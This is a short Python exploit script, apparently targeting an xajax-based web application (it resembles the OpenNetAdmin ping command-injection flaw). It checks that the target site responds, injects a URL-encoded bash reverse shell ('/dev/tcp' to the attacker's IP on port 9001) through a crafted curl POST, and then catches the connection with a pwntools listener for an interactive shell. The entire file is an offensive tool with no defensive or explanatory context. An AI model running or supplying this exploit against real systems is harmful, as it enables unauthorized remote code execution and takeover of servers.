#!/usr/bin/env python3

import sys
from pwn import *
import subprocess
import requests

def website_check(url):
    log.progress("Checking the connection")
    session = requests.session()
    r = session.get(url)
    log.progress("Checking the connection")
    if r.status_code == 200:
        print("Website working")

    else:
        print("Website not working")
        sys.exit()

def shell(ip, url):
    bash_payload = "bash -c 'bash -i >& /dev/tcp/{}/9001 0>&1'".format(ip)
    payload = urlencode(bash_payload)
    log.progress("Getting the Shell")
    subprocess.Popen('curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;{}&xajaxargs[]=ping" {}'.format(payload, url),shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    l = listen(9001)
    l.wait_for_connection()
    log.progress("Got the shell")
    l.sendline("export TERM=xterm")
    l.interactive()
    sys.exit()


if __name__ == '__main__':
    if len(sys.argv[1:]) < 2:
        print("\n Usage:python3 %ss.py <source_ip> <url> \n")
    else:
        ip = sys.argv[1].strip()
        url = sys.argv[2].lower().strip()
        website_check(url)
        shell(ip, url)